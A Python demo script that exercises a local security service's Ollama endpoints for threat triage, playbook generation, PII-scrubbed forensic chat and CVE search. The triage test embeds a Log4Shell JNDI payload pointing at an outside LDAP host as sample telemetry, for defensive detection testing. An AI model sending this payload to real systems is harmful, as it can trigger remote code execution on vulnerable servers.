#!/usr/bin/env python3
import urllib.request
import json

BASE = "http://127.0.0.1:9090/api/v1"

def call(endpoint, data=None):
    url = f"{BASE}/{endpoint}"
    body = json.dumps(data).encode("utf-8") if data else None
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode("utf-8"))

print("=" * 65)
print("🧠 LIVE DEMO: TESTING OLLAMA VIA JIA SERVICE")
print("=" * 65)

# 1. Ollama Status
print("\n[1] Querying /api/v1/ollama/status:")
status = call("ollama/status")
print(f"  • Ollama Online: {status.get('ollama_online')}")
print(f"  • Endpoint: {status.get('endpoint')}")
print(f"  • Total VRAM Allocated: {status.get('total_vram_allocated_mb')} MB (Cap: {status.get('vram_cap_mb')} MB)")
print("  • Discovered Local Models:")
for m in status.get("models", []):
    print(f"    - {m['name']:<25} Type: {m['model_type']:<15} Size: {m['size_vram_mb']}MB")

# 2. Structured Cognitive Threat Triage
print("\n[2] Testing /api/v1/ollama/triage (Log4j / JNDI Payload):")
triage = call("ollama/triage", {
    "incident_id": "INC-2026-LIVE-01",
    "raw_telemetry": "GET /api HTTP/1.1 User-Agent: ${jndi:ldap://198.51.100.42:1389/Exploit}",
    "source_ip": "198.51.100.42"
})
print(f"  • Incident ID: {triage.get('incident_id')}")
print(f"  • Identified CVE: {triage.get('identified_cve')} (CVSS {triage.get('cvss_score')}, Severity: {triage.get('severity')})")
print(f"  • MITRE ATT&CK Tactics: {triage.get('mitre_tactics')}")
print(f"  • Recommended Action: {triage.get('recommended_action')}")
print(f"  • AI Reasoning: {triage.get('ai_reasoning')}")

# 3. Autonomous Playbook Synthesis with Anti-Hallucination Safety Gate
print("\n[3] Testing /api/v1/ollama/generate_playbook:")
playbook = call("ollama/generate_playbook", {
    "threat_description": "Detected memfd_create fileless rootkit injection",
    "target_ip": "198.51.100.42",
    "cve_id": "CVE-2024-3094"
})
print(f"  • Success: {playbook.get('success')}")
print(f"  • Zero Data Exfiltration: {playbook.get('zero_data_exfiltration')}")
print(f"  • Generation Latency: {playbook.get('generation_latency_ms', 0):.2f}ms")
safety = playbook.get("safety_validation", {})
print(f"  • Safety AST Verification: Safe={safety.get('safe_to_execute')}, Violations={safety.get('violation_reasons')}")
print(f"  • Synthesized Rhai Playbook:\n{playbook.get('synthesized_rhai_playbook')}")

# 4. Multi-Turn Forensic Chat with PII Scrubbing
print("\n[4] Testing /api/v1/ollama/forensic_chat (With PII Scrubbing):")
chat = call("ollama/forensic_chat", {
    "incident_id": "INC-2026-LIVE-01",
    "messages": [
        {"role": "user", "content": "Analyst Charles Gutierrez (SSN: 123-45-6789). Summarize what actions were taken against IP 198.51.100.42."}
    ]
})
print(f"  • Model Used: {chat.get('model_used')}")
print(f"  • AI Response: {chat.get('reply')}")

# 5. Hybrid Semantic Vector RAG Search
print("\n[5] Testing /api/v1/rag/search (Semantic Vector Search with nomic-embed-text):")
rag = call("rag/search", {
    "query": "Remote code execution in logging framework via JNDI lookup",
    "top_k": 2
})
matches = rag.get("matches", [])
top = matches[0] if matches else {}
print(f"  • Query: {rag.get('query')}")
print(f"  • Total Matches Found: {rag.get('total_matches')}")
print(f"  • Best Matched CVE: {top.get('cve_id')}")
print(f"  • Similarity Score: {top.get('similarity_score', 0):.4f}")
print(f"  • Description: {top.get('description')}")


print("\n" + "=" * 65)
print("🎉 OLLAMA INTEGRATION VIA JIA IS WORKING 100% OPERATIONAL!")
print("=" * 65)
